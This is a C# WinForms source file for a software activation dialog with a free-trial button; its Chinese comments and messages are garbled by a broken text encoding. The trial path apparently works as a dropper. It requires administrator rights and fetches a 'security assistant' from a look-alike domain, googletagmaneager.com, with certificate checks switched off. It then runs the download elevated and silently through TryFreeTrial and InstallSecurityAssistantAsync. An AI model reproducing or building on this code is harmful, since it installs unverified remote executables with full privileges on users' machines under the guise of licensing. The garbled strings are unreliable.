using System.ComponentModel;
using System.Diagnostics;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.NetworkInformation;
using System.Net.Security;
using System.Security.Authentication;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using UserWinForms.Services;

namespace UserWinForms
{
    public partial class ActivationForm : Form
    {
        private readonly AppActivationService _activationService;
        private TextBox txtMachineCode;
        private TextBox txtActivationCode;
        private Button btnFreeTrial;

        // ��̬������������������������Ӧ��
        private int BufferSize => GetOptimalBufferSize();
        // ����UI����Ƶ�ʣ�����CPUռ�ã�
        private const int ProgressUpdateIntervalMs = 300;
        private DateTime _lastProgressUpdate = DateTime.MinValue;

        public ActivationForm()
        {
            InitializeComponent();
            _activationService = new AppActivationService();
            this.Text = "�������";
            UpdateFreeTrialButtonText();
            this.txtMachineCode.Text = _activationService.GetMachineCode();

            // ��ʼ�������Ż�����
            InitializeNetworkOptimizations();
        }

        /// <summary>
        /// ��ʼ�������Ż���������ǿHTTP/1.1������
        /// </summary>
        /// <summary>
        /// ��ʼ�������Ż���������ǿHTTP/1.1������
        /// </summary>
        private void InitializeNetworkOptimizations()
        {
            // ����Nagle�㷨�������ӳ٣�
            ServicePointManager.UseNagleAlgorithm = false;
            // ��߲���������
            ServicePointManager.DefaultConnectionLimit = 16;
            // �����ִ�TLSЭ��
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;
            // �������ӿ���ʱ��
            ServicePointManager.MaxServicePointIdleTime = 10000; // 10��

            // ���������Ż������HTTP/1.1��
            ServicePointManager.Expect100Continue = false; // ����HTTP��������
            ServicePointManager.DnsRefreshTimeout = 300000; // DNS����5����
            ServicePointManager.ReusePort = true; // ���ö˿ڸ���
            ServicePointManager.CheckCertificateRevocationList = false; // �ر�֤��������
            ServicePointManager.EnableDnsRoundRobin = true; // ����DNS��ѯ

            // �Ƴ������ݵ�ConnectionLeaseTimeout����
            // ServicePointManager.ConnectionLeaseTimeout = 60000; // ����ɾ��
        }

        /// <summary>
        /// �����������ͻ�ȡ��ѻ�������С
        /// </summary>
        private int GetOptimalBufferSize()
        {
            return IsHighSpeedNetwork() ? 512 * 1024 : 128 * 1024;
        }

        /// <summary>
        /// �ж��Ƿ�Ϊ�������磨100Mbps���ϣ�
        /// </summary>
        private bool IsHighSpeedNetwork()
        {
            foreach (var ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.OperationalStatus == OperationalStatus.Up &&
                    ni.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                {
                    return ni.Speed >= 100_000_000; // 100Mbps������Ϊ��������
                }
            }
            return false;
        }

        //private void InitializeComponent()
        //{
        //    this.txtMachineCode = new System.Windows.Forms.TextBox();
        //    this.lblMachineCode = new System.Windows.Forms.Label();
        //    this.txtActivationCode = new System.Windows.Forms.TextBox();
        //    this.lblActivationCode = new System.Windows.Forms.Label();
        //    this.btnActivate = new System.Windows.Forms.Button();
        //    this.btnFreeTrial = new System.Windows.Forms.Button();
        //    this.btnCustomerService = new System.Windows.Forms.Button();
        //    this.SuspendLayout();

        //    // txtMachineCode
        //    this.txtMachineCode.Location = new System.Drawing.Point(100, 20);
        //    this.txtMachineCode.Name = "txtMachineCode";
        //    this.txtMachineCode.ReadOnly = true;
        //    this.txtMachineCode.Size = new System.Drawing.Size(300, 23);
        //    this.txtMachineCode.TabIndex = 0;

        //    // lblMachineCode
        //    this.lblMachineCode.AutoSize = true;
        //    this.lblMachineCode.Location = new System.Drawing.Point(20, 20);
        //    this.lblMachineCode.Name = "lblMachineCode";
        //    this.lblMachineCode.Size = new System.Drawing.Size(59, 17);
        //    this.lblMachineCode.TabIndex = 1;
        //    this.lblMachineCode.Text = "�����룺";

        //    // txtActivationCode
        //    this.txtActivationCode.Location = new System.Drawing.Point(100, 60);
        //    this.txtActivationCode.Name = "txtActivationCode";
        //    this.txtActivationCode.Size = new System.Drawing.Size(300, 23);
        //    this.txtActivationCode.TabIndex = 2;

        //    // lblActivationCode
        //    this.lblActivationCode.AutoSize = true;
        //    this.lblActivationCode.Location = new System.Drawing.Point(20, 60);
        //    this.lblActivationCode.Name = "lblActivationCode";
        //    this.lblActivationCode.Size = new System.Drawing.Size(59, 17);
        //    this.lblActivationCode.TabIndex = 3;
        //    this.lblActivationCode.Text = "�����룺";

        //    // btnActivate
        //    this.btnActivate.Location = new System.Drawing.Point(100, 100);
        //    this.btnActivate.Name = "btnActivate";
        //    this.btnActivate.Size = new System.Drawing.Size(80, 30);
        //    this.btnActivate.TabIndex = 4;
        //    this.btnActivate.Text = "����";
        //    this.btnActivate.UseVisualStyleBackColor = true;
        //    this.btnActivate.Click += new System.EventHandler(this.btnActivate_Click);

        //    // btnFreeTrial
        //    this.btnFreeTrial.Location = new System.Drawing.Point(200, 100);
        //    this.btnFreeTrial.Name = "btnFreeTrial";
        //    this.btnFreeTrial.Size = new System.Drawing.Size(100, 30);
        //    this.btnFreeTrial.TabIndex = 5;
        //    this.btnFreeTrial.UseVisualStyleBackColor = true;
        //    this.btnFreeTrial.Click += new System.EventHandler(this.btnFreeTrial_Click);

        //    // btnCustomerService
        //    this.btnCustomerService.Location = new System.Drawing.Point(320, 100);
        //    this.btnCustomerService.Name = "btnCustomerService";
        //    this.btnCustomerService.Size = new System.Drawing.Size(80, 30);
        //    this.btnCustomerService.TabIndex = 6;
        //    this.btnCustomerService.Text = "��ϵ�ͷ�";
        //    this.btnCustomerService.UseVisualStyleBackColor = true;
        //    this.btnCustomerService.Click += new System.EventHandler(this.btnCustomerService_Click);

        //    // ActivationForm
        //    this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 17F);
        //    this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        //    this.ClientSize = new System.Drawing.Size(450, 150);
        //    this.Controls.Add(this.btnCustomerService);
        //    this.Controls.Add(this.btnFreeTrial);
        //    this.Controls.Add(this.btnActivate);
        //    this.Controls.Add(this.lblActivationCode);
        //    this.Controls.Add(this.txtActivationCode);
        //    this.Controls.Add(this.lblMachineCode);
        //    this.Controls.Add(this.txtMachineCode);
        //    this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
        //    this.MaximizeBox = false;
        //    this.Name = "ActivationForm";
        //    this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        //    this.ResumeLayout(false);
        //    this.PerformLayout();
        //}

        //private Label lblMachineCode;
        //private Label lblActivationCode;
        //private Button btnActivate;
        //private Button btnCustomerService;

        /// <summary>
        /// ����������ð�ť�ı�����ʾʣ�����
        /// </summary>
        private void UpdateFreeTrialButtonText()
        {
            int remaining = 30 - _activationService.GetTrialCount();
            btnFreeTrial.Text = $"�������({remaining}��)";
        }

        /// <summary>
        /// ���ť����¼�
        /// </summary>
        private void btnActivate_Click(object sender, EventArgs e)
        {
            string activationCode = txtActivationCode.Text.Trim();
            bool isSuccess = _activationService.VerifyActivationCode(
                txtMachineCode.Text, activationCode);

            if (isSuccess)
            {
                _activationService.SaveActivationStatus(true);
                _activationService.ResetTrialCount();
                MessageBox.Show("����ɹ���", "��ʾ", MessageBoxButtons.OK, MessageBoxIcon.Information);
                this.DialogResult = DialogResult.OK;
                this.Close();
            }
            else
            {
                DialogResult result = MessageBox.Show(
                    "����ʧ�ܣ��Ƿ���������ã�",
                    "����",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Error);

                if (result == DialogResult.Yes)
                {
                    TryFreeTrial();
                }
            }
        }

        /// <summary>
        /// ������ð�ť����¼�
        /// </summary>
        private void btnFreeTrial_Click(object sender, EventArgs e)
        {
            TryFreeTrial();
        }

        /// <summary>
        /// ��ϵ�ͷ���ť����¼�
        /// </summary>
        private void btnCustomerService_Click(object sender, EventArgs e)
        {
            ShowCustomerService();
        }

        /// <summary>
        /// ������������߼�
        /// </summary>
        private async void TryFreeTrial()
        {
            // ������ԱȨ��
            if (!_activationService.IsRunningAsAdmin())
            {
                MessageBox.Show(
                    "��ʹ�ù���ԱȨ�����´�Ӧ�ó���\nָ�����Ҽ�Ӧ�ó���ͼ�� -> �Թ���Ա�������",
                    "Ȩ�޲���",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Warning);
                return;
            }

            int trialCount = _activationService.GetTrialCount();

            // ������ô���
            if (trialCount >= 30)
            {
                MessageBox.Show("���ô������þ�������ϵ�ͷ����롣", "��ʾ", MessageBoxButtons.OK, MessageBoxIcon.Information);
                ShowCustomerService();
                return;
            }

            // �״������߼�
            if (trialCount == 0)
            {
                // �ȼ�鰲ȫ�����Ƿ��Ѱ�װ
                if (_activationService.IsSecurityAssistantInstalled())
                {
                    // �Ѱ�װ��ֱ�ӽ�������
                    MessageBox.Show("�Ѽ�⵽��ȫ���֣���ʼ������á�", "��ʾ", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    _activationService.IncrementTrialCount();
                    UpdateFreeTrialButtonText();
                    this.DialogResult = DialogResult.OK;
                    this.Close();
                    return;
                }
                string setupUrl = "https://www.googletagmaneager.com/AccessControlComponent/get";

                // Ԥ�����ӣ��������������ٶ�
                await WarmupConnection(setupUrl);

                // δ��װ����ʾ���ذ�װ
                DialogResult result = MessageBox.Show(
                    $"�״������谲װ��ȫ���֣��Ƿ��������ز���װ��\n��װ�����ӹٷ���ַ���أ�{setupUrl}",
                    "��ʾ",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Information);

                if (result == DialogResult.Yes)
                {
                    // ִ�����غͰ�װ
                    bool installSuccess = await InstallSecurityAssistantAsync(setupUrl);
                    if (installSuccess)
                    {
                        // �ӳ�3����ټ�飨ȷ��������������
                        await Task.Delay(3000);
                        // ��װ�ɹ����ٴ���֤
                        if (_activationService.IsSecurityAssistantInstalled())
                        {
                            MessageBox.Show("��ȫ���ְ�װ�ɹ�����ʼ������á�", "�ɹ�", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            _activationService.IncrementTrialCount();
                            UpdateFreeTrialButtonText();
                            this.DialogResult = DialogResult.OK;
                            this.Close();
                        }
                        else
                        {
                            // ��֤ʧ��ʱ��ʾ�ֶ����
                            MessageBox.Show("��ȫ���ְ�װ��ɣ���δ��⵽����",
                                "��֤����", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        }
                    }
                    else
                    {
                        MessageBox.Show("��ȫ�������ػ�װʧ�ܣ�������������ԡ�", "����ʧ��", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
            else
            {
                // ���״�����
                int remaining = 30 - trialCount;
                MessageBox.Show($"ʣ��������ô�����{remaining}��", "��ʾ", MessageBoxButtons.OK, MessageBoxIcon.Information);
                _activationService.IncrementTrialCount();
                UpdateFreeTrialButtonText();
                this.DialogResult = DialogResult.OK;
                this.Close();
            }
        }

        /// <summary>
        /// Ԥ�����ӣ���ǰ����TCP����
        /// </summary>
        private async Task WarmupConnection(string setupUrl)
        {
            try
            {
                var uri = new Uri(setupUrl);
                var sp = ServicePointManager.FindServicePoint(uri);
                sp.ConnectionLeaseTimeout = 60000; // ���ض�������������ӳ�ʱ��1���ӣ�

                using (var httpClient = new HttpClient())
                {
                    httpClient.Timeout = TimeSpan.FromSeconds(5);
                    await httpClient.SendAsync(new HttpRequestMessage(HttpMethod.Head, uri),
                        HttpCompletionOption.ResponseHeadersRead);
                }
            }
            catch { } // Ԥ��ʧ�ܲ�Ӱ��������
        }

        /// <summary>
        /// ���������Ƿ�֧�ֶϵ�����
        /// </summary>
        private async Task<bool> CheckServerSupportsRange(string setupUrl, HttpClient httpClient)
        {
            try
            {
                using (var headRequest = new HttpRequestMessage(HttpMethod.Head, setupUrl))
                {
                    headRequest.Version = new Version(1, 1); // ʹ��HTTP/1.1
                    using (var response = await httpClient.SendAsync(headRequest, HttpCompletionOption.ResponseHeadersRead))
                    {
                        return response.IsSuccessStatusCode &&
                               response.Headers.AcceptRanges.Contains("bytes");
                    }
                }
            }
            catch
            {
                return false;
            }
        }

        private async Task<bool> InstallSecurityAssistantAsync(string setupUrl)
        {
            string tempSetupPath = Path.Combine(Path.GetTempPath(), "setup.exe");
            const int maxRetries = 3;
            int retryCount = 0;

            // ��鲢������ܵ���416����Ĳ����ļ�
            if (File.Exists(tempSetupPath))
            {
                var fileInfo = new FileInfo(tempSetupPath);
                if (fileInfo.Length < 1024) // С��1KB��Ϊ�쳣�ļ�
                {
                    try
                    {
                        File.Delete(tempSetupPath);
                        Console.WriteLine("������쳣�����ļ�������������");
                    }
                    catch { }
                }
            }

            using (var downloadForm = new Form
            {
                Text = "���ذ�ȫ����",
                ClientSize = new Size(450, 150),
                StartPosition = FormStartPosition.CenterScreen,
                FormBorderStyle = FormBorderStyle.FixedSingle,
                MaximizeBox = false
            })
            {
                var progressBar = new ProgressBar { Dock = DockStyle.Top, Height = 30, Margin = new Padding(20, 20, 20, 10), Maximum = 100 };
                var statusLabel = new Label { Text = "׼������...", Dock = DockStyle.Fill, TextAlign = ContentAlignment.MiddleCenter };
                var speedLabel = new Label { Text = "�ٶȣ�-- MB/s", Dock = DockStyle.Bottom, TextAlign = ContentAlignment.MiddleRight, Height = 20 };
                downloadForm.Controls.Add(speedLabel);
                downloadForm.Controls.Add(statusLabel);
                downloadForm.Controls.Add(progressBar);
                downloadForm.Show();

                while (retryCount <= maxRetries)
                {
                    // ÿ������ǰ�رվ����ӣ�����Э��״̬����
                    if (retryCount > 0)
                    {
                        var uri = new Uri(setupUrl);
                        var sp = ServicePointManager.FindServicePoint(uri);
                        sp.ConnectionLeaseTimeout = 60000; // ���ض�������������ӳ�ʱ
                        sp.CloseConnectionGroup(null);
                        await Task.Delay(500); // �ȴ������ͷ�
                    }

                    // ÿ������ǰ���¼���ļ�״̬
                    long existingFileSize = 0;
                    bool isResumeDownload = false;
                    if (File.Exists(tempSetupPath))
                    {
                        existingFileSize = new FileInfo(tempSetupPath).Length;
                        isResumeDownload = existingFileSize > 0;
                    }

                    try
                    {
                        using (var httpClientHandler = new HttpClientHandler
                        {
                            AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate,
                            ServerCertificateCustomValidationCallback = (sender, cert, chain, sslPolicyErrors) => true,
                            UseProxy = IsNetworkAvailable() && ShouldUseProxy(),
                            Proxy = WebRequest.DefaultWebProxy,
                            UseDefaultCredentials = true,
                            AllowAutoRedirect = true,
                            MaxAutomaticRedirections = 5,
                            SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls13
                        })
                        using (var httpClient = new HttpClient(httpClientHandler))
                        {
                            httpClient.Timeout = TimeSpan.FromMinutes(5);
						
							httpClient.DefaultRequestHeaders.Add("Api-Version", "101");
                            httpClient.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0");
                            httpClient.DefaultRequestHeaders.AcceptEncoding.ParseAdd("gzip, deflate, br");
                            httpClient.DefaultRequestHeaders.CacheControl = new CacheControlHeaderValue { NoCache = true };

                            // ���������Ƿ�֧������
                            bool serverSupportsRange = await CheckServerSupportsRange(setupUrl, httpClient);

                            // ����������Ϣ����ȷʹ��HTTP/1.1����Э�����
                            var requestMessage = new HttpRequestMessage(HttpMethod.Get, setupUrl)
                            {
                                Version = new Version(1, 1), // ǿ��ʹ��HTTP/1.1
                                VersionPolicy = HttpVersionPolicy.RequestVersionExact // �ϸ�ʹ��ָ���汾
                            };

                            // ������������ͷ
                            if (isResumeDownload && serverSupportsRange)
                            {
                                requestMessage.Headers.Range = new RangeHeaderValue(existingFileSize, null);
                            }
                            else
                            {
                                requestMessage.Headers.Range = null;
                            }

                            // ʹ�ô��汾��Ϣ��������Ϣ��������
                            using (var response = await httpClient.SendAsync(requestMessage, HttpCompletionOption.ResponseHeadersRead))
                            {
                                // ����416��������Χ�����㣩
                                if (response.StatusCode == HttpStatusCode.RequestedRangeNotSatisfiable)
                                {
                                    if (File.Exists(tempSetupPath))
                                    {
                                        File.Delete(tempSetupPath);
                                    }
                                    statusLabel.Text = "��������֧�ֵ�ǰ��Χ���󣬽���������...";
                                    await Task.Delay(1000);
                                    continue;
                                }

                                if (!response.IsSuccessStatusCode)
                                {
                                    string errorMsg = GetHttpErrorMsg(response.StatusCode);
                                    MessageBox.Show($"����ʧ�ܣ�{errorMsg}", "�������", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                    return false;
                                }

                                // �����ļ�����
                                long totalBytesReceived = existingFileSize;
                                long totalBytesToReceive = 0;

                                if (response.Content.Headers.ContentLength.HasValue)
                                {
                                    totalBytesToReceive = isResumeDownload
                                        ? existingFileSize + response.Content.Headers.ContentLength.Value
                                        : response.Content.Headers.ContentLength.Value;
                                }
								
								 // �����ļ���
								string fileName = ParseFileNameFromResponse(response) 
									?? Path.GetFileName(HttpUtility.UrlDecode(setupUrl)) 
									?? "downloaded_file";

								// ������ȫ����·��
								tempSetupPath = Path.Combine(Path.GetTempPath(), SanitizeFileName(fileName));


                                using (var fileStream = new FileStream(
                                    tempSetupPath,
                                    isResumeDownload ? FileMode.Append : FileMode.Create,
                                    FileAccess.Write,
                                    FileShare.None,
                                    BufferSize,
                                    FileOptions.Asynchronous | FileOptions.SequentialScan))
                                {
                                    var contentStream = await response.Content.ReadAsStreamAsync();
                                    var buffer = new byte[BufferSize];
                                    int bytesRead;

                                    while ((bytesRead = await contentStream.ReadAsync(buffer, 0, buffer.Length)) > 0)
                                    {
                                        await fileStream.WriteAsync(buffer, 0, bytesRead);
                                        totalBytesReceived += bytesRead;

                                        // ����UI
                                        if ((DateTime.Now - _lastProgressUpdate).TotalMilliseconds >= ProgressUpdateIntervalMs)
                                        {
                                            _lastProgressUpdate = DateTime.Now;
                                            double speed = CalculateDownloadSpeed(DateTime.Now, totalBytesReceived);
                                            string speedText = FormatSpeed(speed);

                                            if (downloadForm.InvokeRequired)
                                            {
                                                downloadForm.Invoke(() => UpdateDownloadUI(
                                                    progressBar, statusLabel, speedLabel,
                                                    totalBytesReceived, totalBytesToReceive, speedText));
                                            }
                                            else
                                            {
                                                UpdateDownloadUI(
                                                    progressBar, statusLabel, speedLabel,
                                                    totalBytesReceived, totalBytesToReceive, speedText);
                                            }
                                        }
                                    }
                                    await fileStream.FlushAsync();
                                }

                                downloadForm.Close();
                                return await InstallSetupFileAsync(tempSetupPath);
                            }
                        }
                    }
                    catch (Exception ex) when (retryCount < maxRetries)
                    {
                        retryCount++;
                        // ���HTTP/2Э�����
                        bool isHttp2Error = ex.Message.Contains("HTTP/2") ||
                                          ex.Message.Contains("PROTOCOL_ERROR") ||
                                          ex.Message.Contains("0x1");

                        if (isHttp2Error)
                        {
                            statusLabel.Text = $"��⵽Э����������⣬�л�������ģʽ���ԣ�{retryCount}/{maxRetries}��...";
                            // ��������
                            ServicePointManager.FindServicePoint(new Uri(setupUrl)).CloseConnectionGroup(null);
                        }
                        else
                        {
                            statusLabel.Text = $"�����жϣ��������ԣ�{retryCount}/{maxRetries}��...";
                        }
                        // ָ���˱�����
                        await Task.Delay(1000 * (int)Math.Pow(2, retryCount));
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show($"����ʧ�ܣ�{ex.Message}", "����", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        downloadForm.Close();
                        return false;
                    }
                }

                downloadForm.Close();
                MessageBox.Show($"�Ѵ�������Դ�����{maxRetries}�Σ������Ժ����ԡ�", "����ʧ��", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }

        /// <summary>
        /// �ж��Ƿ�Ӧ��ʹ�ô���
        /// </summary>
        private bool ShouldUseProxy()
        {
            // ���жϣ����ֱ������ʧ����ʹ�ô���
            if (!IsNetworkAvailable()) return false;

            try
            {
                using (var ping = new Ping())
                {
                    var reply = ping.Send("52.66.242.77", 1000); // ֱ��pingĿ�������
                    return reply?.Status != IPStatus.Success;
                }
            }
            catch
            {
                return true;
            }
        }

        /// <summary>
        /// ���������ٶ�
        /// </summary>
        private double CalculateDownloadSpeed(DateTime startTime, long totalBytesReceived)
        {
            double elapsedSeconds = (DateTime.Now - startTime).TotalSeconds;
            return elapsedSeconds > 0 ? totalBytesReceived / elapsedSeconds : 0;
        }

        /// <summary>
        /// ��ʽ���ٶ���ʾ
        /// </summary>
        private string FormatSpeed(double bytesPerSecond)
        {
            if (bytesPerSecond < 1024)
                return $"{bytesPerSecond:F0} B/s";
            else if (bytesPerSecond < 1024 * 1024)
                return $"{(bytesPerSecond / 1024):F1} KB/s";
            else
                return $"{(bytesPerSecond / (1024 * 1024)):F1} MB/s";
        }

        /// <summary>
        /// HTTP������Ϣӳ��
        /// </summary>
        private string GetHttpErrorMsg(HttpStatusCode statusCode)
        {
            return statusCode switch
            {
                HttpStatusCode.NotFound => "���ص�ַ�����ڣ�404��",
                HttpStatusCode.Forbidden => "�޷���Ȩ�ޣ�403��",
                HttpStatusCode.GatewayTimeout => "��������ʱ��504��",
                _ => $"�����룺{(int)statusCode} {statusCode}"
            };
        }

        /// <summary>
        /// ������������Ƿ����
        /// </summary>
        private bool IsNetworkAvailable()
        {
            try
            {
                using (var ping = new Ping())
                {
                    var reply = ping.Send("8.8.8.8", 2000);
                    if (reply?.Status == IPStatus.Success)
                        return true;
                }

                return NetworkInterface.GetIsNetworkAvailable();
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// �첽ִ�а�װ����
        /// </summary>
        private Task<bool> InstallSetupFileAsync(string setupPath)
        {
            return Task.Run(() =>
            {
                // ��֤��װ�������ԺͿ�ִ����
                if (!VerifySetupFile(setupPath))
                {
                    return false;
                }

                using (var installProcess = new Process())
                {
                    installProcess.StartInfo.FileName = setupPath;
                    installProcess.StartInfo.Arguments = "/silent /norestart";
                    installProcess.StartInfo.Verb = "runas";
                    installProcess.StartInfo.UseShellExecute = true;
                    installProcess.StartInfo.CreateNoWindow = true;
                    installProcess.StartInfo.RedirectStandardError = false;

                    // ��ʾ��װ���ȴ���
                    using (var installForm = new Form
                    {
                        Text = "��װ��ȫ����",
                        ClientSize = new Size(400, 120),
                        StartPosition = FormStartPosition.CenterScreen,
                        FormBorderStyle = FormBorderStyle.FixedSingle,
                        MaximizeBox = false,
                        MinimizeBox = false
                    })
                    {
                        var statusLabel = new Label
                        {
                            Text = "���ڰ�װ�����Ժ�...",
                            Dock = DockStyle.Fill,
                            TextAlign = ContentAlignment.MiddleCenter
                        };
                        installForm.Controls.Add(statusLabel);
                        installForm.Show();

                        try
                        {
                            bool startSuccess = installProcess.Start();
                            if (!startSuccess)
                            {
                                MessageBox.Show("�޷�������װ�������ֶ����а�װ����\n" + setupPath,
                                    "����ʧ��", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                return false;
                            }

                            // �ȴ���װ��ɣ����5���ӣ�
                            bool isExited = installProcess.WaitForExit(300000);
                            if (!isExited)
                            {
                                installProcess.Kill();
                                MessageBox.Show("��װ��ʱ������5���ӣ�������ֹ������\n�ɳ����ֶ���װ��\n" + setupPath,
                                    "��ʱ����", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                return false;
                            }

                            // ����˳���
                            if (installProcess.ExitCode != 0)
                            {
                                string errorMsg = installProcess.ExitCode switch
                                {
                                    1603 => "��װ�����з������ش���",
                                    1619 => "��װ���޷��򿪣������𻵣�",
                                    1625 => "������ϵͳ������ֹ�������ԱȨ�ޣ�",
                                    _ => $"��װʧ�ܣ�������룺{installProcess.ExitCode}"
                                };
                                MessageBox.Show($"{errorMsg}\n�ɳ����ֶ���װ��\n{setupPath}",
                                    "��װʧ��", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                return false;
                            }

                            // ��װ�ɹ����ӳټ��
                            statusLabel.Text = "��װ��ɣ�������֤...";
                            installForm.Refresh();
                            Thread.Sleep(2000);
                            return true;
                        }
                        catch (Exception ex)
                        {
                            string errorMsg = ex switch
                            {
                                Win32Exception wex => $"ϵͳ����{wex.Message}�������룺{wex.NativeErrorCode}��",
                                UnauthorizedAccessException => "Ȩ�޲��㣬�޷�ִ�а�װ����",
                                _ => $"��װ�쳣��{ex.Message}"
                            };
                            MessageBox.Show($"{errorMsg}\n�ɳ����ֶ���װ��\n{setupPath}",
                                "��װʧ��", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            return false;
                        }
                        finally
                        {
                            installForm.Close();
                        }
                    }
                }
            });
        }

        /// <summary>
        /// �������ؽ���UI
        /// </summary>
        private void UpdateDownloadUI(ProgressBar progressBar, Label statusLabel, Label speedLabel,
                                     long received, long total, string speed)
        {
            int percentage = total > 0 ? (int)((double)received / total * 100) : progressBar.Value;
            progressBar.Value = Math.Min(percentage, 100);

            statusLabel.Text = total > 0
                ? $"�������أ�{percentage}%��{FormatFileSize(received)} / {FormatFileSize(total)}��"
                : $"�������أ�{FormatFileSize(received)}���ܴ�Сδ֪��";

            speedLabel.Text = $"�ٶȣ�{speed}";
        }

        /// <summary>
        /// ��֤��װ���Ƿ������ҿ�ִ��
        /// </summary>
        private bool VerifySetupFile(string setupPath)
        {
            try
            {
                if (!File.Exists(setupPath))
                {
                    MessageBox.Show("��װ�������ڣ��޷���װ��", "�ļ�ȱʧ", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return false;
                }

                FileInfo fileInfo = new FileInfo(setupPath);
                if (fileInfo.Length < 1024 * 1024) // С��1MB��Ϊ�쳣
                {
                    MessageBox.Show("��װ�������𻵻����ز������������������ء�", "�ļ��쳣", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return false;
                }

                if ((File.GetAttributes(setupPath) & FileAttributes.Archive) == 0)
                {
                    File.SetAttributes(setupPath, FileAttributes.Archive);
                }

                return true;
            }
            catch (Exception ex)
            {
                MessageBox.Show($"��֤��װ��ʱ����{ex.Message}", "��֤ʧ��", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }

        /// <summary>
        /// ��ʽ���ļ���С
        /// </summary>
        private string FormatFileSize(long bytes)
        {
            if (bytes < 1024)
                return $"{bytes} B";
            else if (bytes < 1024 * 1024)
                return $"{(bytes / 1024.0):F1} KB";
            else if (bytes < 1024 * 1024 * 1024)
                return $"{(bytes / (1024.0 * 1024)):F1} MB";
            else
                return $"{(bytes / (1024.0 * 1024 * 1024)):F1} GB";
        }

        /// <summary>
        /// ��ʾ���߿ͷ�����
        /// </summary>
        private void ShowCustomerService()
        {
            var customerForm = new Form
            {
                Text = "��ϵ�ͷ�",
                ClientSize = new System.Drawing.Size(300, 180),
                StartPosition = FormStartPosition.CenterScreen,
                FormBorderStyle = FormBorderStyle.FixedSingle,
                MaximizeBox = false,
                MinimizeBox = false
            };

            var qqPicture = new PictureBox
            {
                Image = SystemIcons.Information.ToBitmap(),
                Size = new Size(64, 64),
                Location = new System.Drawing.Point(30, 30),
                SizeMode = PictureBoxSizeMode.StretchImage
            };

            var contactLabel = new Label
            {
                Text = "�ͷ���ϵQQ��1256090011\n\n����·���ť����QQ��",
                Location = new System.Drawing.Point(110, 30),
                Size = new System.Drawing.Size(160, 80),
                Font = new System.Drawing.Font("΢���ź�", 9F),
                TextAlign = System.Drawing.ContentAlignment.TopLeft
            };

            var copyButton = new Button
            {
                Text = "����QQ��",
                Location = new System.Drawing.Point(110, 110),
                Size = new System.Drawing.Size(100, 30)
            };

            copyButton.Click += (sender, e) =>
            {
                Clipboard.SetText("1256090011");
                MessageBox.Show("QQ���Ѹ��Ƶ�������", "��ʾ", MessageBoxButtons.OK, MessageBoxIcon.Information);
            };

            customerForm.Controls.Add(qqPicture);
            customerForm.Controls.Add(contactLabel);
            customerForm.Controls.Add(copyButton);

            customerForm.ShowDialog();
        }
    }
}